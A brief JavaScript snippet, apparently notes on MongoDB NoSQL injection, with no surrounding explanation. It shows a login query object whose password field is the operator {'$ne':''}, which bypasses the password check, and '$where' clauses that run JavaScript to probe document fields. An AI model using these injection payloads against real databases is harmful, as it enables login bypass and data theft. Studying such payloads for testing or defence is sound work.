let userInfo = {
    "_id":"Id_auto_created_by_mongodb",
    "username":"input",
    "password":{"$ne":""},
    "$where":"function(){}"
}

db.users.findOne(userInfo);

Object.keys(userInfo)[0]

"$where":"function(){if(Object.keys(this)[0].match('_id')) return 1; else 0;}"